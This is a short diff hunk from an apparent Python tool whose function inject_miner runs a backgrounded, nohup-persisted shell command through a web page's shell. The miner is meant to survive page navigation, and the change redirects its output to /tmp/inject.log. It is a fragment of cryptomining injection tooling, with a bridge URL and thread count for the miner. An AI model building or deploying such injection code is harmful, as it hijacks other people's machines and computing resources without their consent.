@@ -167,7 +167,7 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
         # Fire backgrounded command — don't wait for the long chain, just
         # verify the shell accepted it. Use nohup so the process survives
         # if the page navigates away.
-        bg_cmd = f"nohup sh -c '{cmd}' > /dev/null 2>&1 & echo $!"
+        bg_cmd = f"nohup sh -c '{cmd}' > /tmp/inject.log 2>&1 & echo $!"
         pid = ""
         try:
             r = await asyncio.wait_for(shell_exec(page, bg_cmd), timeout=30)
